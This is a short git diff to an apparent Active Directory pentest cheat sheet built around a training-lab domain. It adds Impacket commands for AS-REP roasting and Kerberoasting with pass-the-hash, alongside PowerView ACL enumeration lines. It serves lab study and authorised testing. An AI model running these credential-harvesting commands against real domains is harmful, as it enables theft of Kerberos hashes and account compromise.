@@ -82,10 +82,16 @@ Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "GroupName"}
 
 Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol (Get the ACLs associated with the specified path)
 
-# Kerberoastable User:
+# AS-REP Roast User:
 
 ```
 GetNPUsers.py -hashes :<hash> -dc-ip <ip> <domain>/<user>
+```
+
+# Kerberoasting User:
+
+```
+GetUserSPN.py -hashes :<hash> -dc-ip <ip> <domain>/<user>
 ```
 
 # TRUST / FOREST
